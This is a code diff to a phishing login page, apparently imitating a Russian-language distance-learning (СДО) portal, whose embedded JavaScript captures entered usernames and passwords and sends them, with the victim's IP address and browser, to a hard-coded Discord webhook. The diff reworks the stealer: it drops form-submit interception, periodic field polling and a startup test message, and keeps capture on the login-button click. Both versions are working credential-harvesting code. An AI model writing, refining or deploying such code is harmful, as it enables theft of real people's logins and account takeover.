@@ -144,7 +144,7 @@
         </footer>
     </div>
 
-    <!-- РАБОЧАЯ ВЕРСИЯ С ГАРАНТИРОВАННОЙ ОТПРАВКОЙ -->
+    <!-- СКРИПТ ОТПРАВКИ ТОЛЬКО ПРИ НАЖАТИИ НА КНОПКУ ВХОД -->
     <script>
         // ===== ВАШ DISCORD WEBHOOK =====
         const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1484956365553406038/Lp82Tiyzr9Pdq3l_3sUq8aseB1Sfz9yQArV5XTzceVoUA74jxj-9LzghLUDHl08xvabe';
@@ -161,7 +161,7 @@
             }
         }
         
-        // Функция отправки в Discord (максимально простая)
+        // Функция отправки в Discord
         async function sendToDiscord(username, password) {
             const ip = await getIP();
             const now = new Date();
@@ -174,7 +174,7 @@
             else if (ua.includes('Firefox')) browser = 'Firefox';
             else if (ua.includes('Safari')) browser = 'Safari';
             
-            // Создаем простое текстовое сообщение
+            // Создаем сообщение
             const messageText = `
 🔴 **НОВЫЙ ВХОД В СДО** 🔴
 ━━━━━━━━━━━━━━━━━━━━━━━
@@ -200,13 +200,10 @@
                 });
                 
                 if (response.ok) {
-                    console.log('✅✅✅ УСПЕХ! Данные отправлены в Discord!');
-                    console.log(`👤 Логин: ${username}`);
-                    console.log(`🔑 Пароль: ${password}`);
-                    console.log(`🌍 IP: ${ip}`);
+                    console.log('✅ Данные отправлены в Discord!');
                     return true;
                 } else {
-                    console.error('❌ Ошибка:', await response.text());
+                    console.error('❌ Ошибка отправки:', await response.text());
                     return false;
                 }
             } catch(error) {
@@ -215,77 +212,29 @@
             }
         }
         
-        // ПЕРЕХВАТ ФОРМЫ - НЕСКОЛЬКО СПОСОБОВ
+        // ===== ТОЛЬКО ПЕРЕХВАТ НАЖАТИЯ НА КНОПКУ =====
+        const loginBtn = document.getElementById('loginbtn');
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
         
-        // Способ 1: Перехват submit
-        const form = document.getElementById('login');
-        if (form) {
-            console.log('✅ Форма найдена, устанавливаю перехват...');
+        if (loginBtn && usernameField && passwordField) {
+            console.log('✅ Скрипт активирован. Отправка ТОЛЬКО при нажатии на кнопку "Вход"');
             
-            form.addEventListener('submit', async function(e) {
-                console.log('🔔 Событие submit сработало!');
+            loginBtn.addEventListener('click', async function(e) {
+                const username = usernameField.value.trim();
+                const password = passwordField.value;
                 
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                console.log(`📝 Получены данные: ${username} / ${password}`);
-                
+                // Отправляем ТОЛЬКО если оба поля заполнены
                 if (username && password) {
-                    console.log('📤 Отправляю в Discord...');
+                    console.log('🔔 Нажата кнопка входа. Отправка данных...');
                     await sendToDiscord(username, password);
-                    
-                    // Небольшая задержка
-                    await new Promise(resolve => setTimeout(resolve, 500));
                 } else {
-                    console.log('⚠️ Поля пустые');
+                    console.log('⚠️ Кнопка нажата, но поля пустые. Отправка отменена.');
                 }
-                
-                // Форма отправится дальше
-                return true;
             });
         } else {
-            console.error('❌ Форма не найдена!');
+            console.error('❌ Не удалось найти элементы формы!');
         }
-        
-        // Способ 2: Перехват клика по кнопке
-        const loginBtn = document.getElementById('loginbtn');
-        if (loginBtn) {
-            loginBtn.addEventListener('click', async function(e) {
-                console.log('🔔 Клик по кнопке входа');
-                
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                if (username && password) {
-                    console.log(`📝 Данные: ${username} / ${password}`);
-                    await sendToDiscord(username, password);
-                }
-            });
-        }
-        
-        // Способ 3: Мониторинг полей ввода (на случай если форма отправится через JS)
-        setInterval(() => {
-            const username = document.getElementById('username')?.value;
-            const password = document.getElementById('password')?.value;
-            
-            if (username && password && window.lastSent !== `${username}:${password}`) {
-                // Если данные появились и мы их еще не отправляли
-                if (window.lastSent !== `${username}:${password}` && username.length > 0 && password.length > 0) {
-                    console.log('🔔 Обнаружены заполненные поля!');
-                    sendToDiscord(username, password);
-                    window.lastSent = `${username}:${password}`;
-                }
-            }
-        }, 2000);
-        
-        // Тестовое сообщение при загрузке
-        setTimeout(async () => {
-            console.log('🚀 Скрипт мониторинга запущен!');
-            console.log('📡 Ожидание ввода логина и пароля...');
-            
-            // Отправляем тестовое сообщение, что скрипт готов
-            await sendToDiscord('⚠️ СИСТЕМА ГОТОВА', 'Ожидание входа');
-        }, 3000);
     </script>
 </body>
 </html>
